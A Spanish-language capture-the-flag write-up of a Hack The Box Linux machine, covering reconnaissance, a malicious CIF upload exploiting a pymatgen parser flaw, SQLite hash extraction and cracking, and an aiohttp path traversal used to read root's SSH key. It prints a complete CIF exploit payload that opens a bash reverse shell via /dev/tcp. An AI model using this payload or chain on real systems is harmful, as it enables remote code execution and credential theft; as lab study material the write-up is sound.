
---
- Tags: #CVE #Easy #HTB #database #Hashcracking #linux 
- ---
#### QUÉ SE EXPLOTA?

Malicious CIF File (RCE)
SQLite Database File Enumeration
Cracking Hashes
aiohttp/3.9.1 Exploitation (CVE-2024.23334) [Privilege Escalation]
''
#### Write UP

##### PRIMER FASE: Reconocimiento

Como siempre empezamos la maquina **haciendo los primeros 2 escaneos para descubrir los puertos abiertos** para este escaneo como siempre utilizamos el **SYN scan**. 
Una vez teniendo los **puertos abiertos** proseguimos a realizar nuestro segundo escaneo. En esta ocasión estaremos escaneando nuevamente los puertos descubiertos **pero ahora lanzaremos los scripts por defecto de nmap, además del script de versión**. 

Primeramente nos encontramos ante un **TTL de 63** , lo cual nos indica que estamos ante una maquina **linux**.
**Encontramos los puertos 22 y 5000 abiertos** 

![[Pasted image 20251030140621.png]]
**Encontramos que el puerto 5000 pertenece a [[UPNP]]**. El puerto nos llevo a una pagina web donde nos tuvimos que registrar.

**La pagina web es un conversor de archivos [[cif]]**. Encontramos que la pagina permite subir archivos y además también descubrimos el los archivos **.cif** tienen una **vulnerabilidad** **[[CVE-2024-23346]]** 

**Tenemos que subir un archivo en la pagina** 
##### SEGUNDA FASE: Explotación

Intentamos con el **payload encontrado en** [github](https://github.com/advisories/GHSA-vgv8-5cpj-qj2f)

![[Pasted image 20251030142913.png]]

**Primero nos mandamos una petición ICMP con ping para verificar que teniamos 

Ocupamos el archivo para poder **vulnerar la página** lo qué hicimos fue modificar el **payload** encontrado por lo siguiente:

```bash
data_5yOhtAoR
_audit_creation_date            2018-06-08
_audit_creation_method          "Pymatgen CIF Parser Arbitrary Code Execution Exploit"

loop_
_parent_propagation_vector.id
_parent_propagation_vector.kxkykz
k1 [0 0 0]

_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+["__sub" + "classes__"]) () if d.__name__ == "BuiltinImporter"][0].load_module ("os").system ("/bin/bash -c \'/bin/bash -i >& /dev/tcp/ip/puerto 0>&1\'");0,0,0'


_space_group_magn.number_BNS  62.448
_space_group_magn.name_BNS  "P  n'  m  a'  "
```

y entablamos una [[Reverse shell]]

Una vez con la lmaquina vulnerada proseguimos a la inspección para **escalar privilegios** 

**No encontramos de entrada ni un SUID** además no perteneciamos a **[[SUDO]]**. 
dentro de nuestro directorio **home** encontramos un archivo **.py** que contenía la configuración del sitio web. 

**Al inspeccionar descubrimos que había una base de datos *[[SQlite]]* por lo que proseguimos a enumerar** 

![[Pasted image 20251030145248.png]]

Nos adentramos a **sqlite3** con el comando...

```bash
sqlite3 <base_de_datos> #(database.db)
```


**Dentro de la base enumeramos las tablas y encontramos usuarios y hashes** recordando que es [[SQlite]].


Proseguimos a **crackear el hash del usuario anteriormente encontrado**. 
Para esto utilizamos https://crackstation.net/. 

Obtuvimos su contraseña y nos transformamos en Rosa

![[Pasted image 20251030153749.png]]

**Siendo Rosa descubrimos que había algo corriendo en el puerto 8080**... 
**Además con [[psypy]]** descubrimos que root estaba ejecutando un sitio web, lo cual nos indicaba que había una pagina siendo ejecutada por root. 

No encontramos nada util en la web incluso después de haber hecho **Remote [[Port Forwarding]]**. 
Checamos los **headers** y encontramos algo interesante.

![[Pasted image 20251030154747.png]]
Una **libreria de python** llamada [[libreria aiohttp]] vulnerable a [[CVE‑2024‑23334]] la cual es vulnerable a [[Directory Path Traversal]].

![[Pasted image 20251030161346.png]]
Ya que podíamos leer archivos sensibles y la pagina la ejecutaba root **proseguimos a leer el .ssh/id_rsa** y con eso nos conectamos a root y obtuvimos la bandera.

![[Pasted image 20251030162623.png]]